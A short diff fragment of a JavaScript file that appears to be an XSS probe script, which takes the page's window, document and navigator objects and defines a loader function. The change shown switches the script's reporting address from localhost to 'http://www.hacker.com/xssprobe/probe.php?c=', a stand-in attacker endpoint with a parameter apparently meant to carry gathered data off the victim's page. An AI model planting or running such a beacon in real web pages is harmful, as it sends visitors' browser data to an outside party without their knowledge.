@@ -19,7 +19,7 @@ if (typeof JSON.stringify !== 'function') {
 }
 
 (function( _window, _document, _navigator, undefined ) {
-    var BASE_URL = "http://localhost:3389/e/",
+    var BASE_URL = "http://www.hacker.com/xssprobe/probe.php?c=",
         NOT_AVAILABLE = "N/A",
         FOUND = "found",
         load = function(url) {
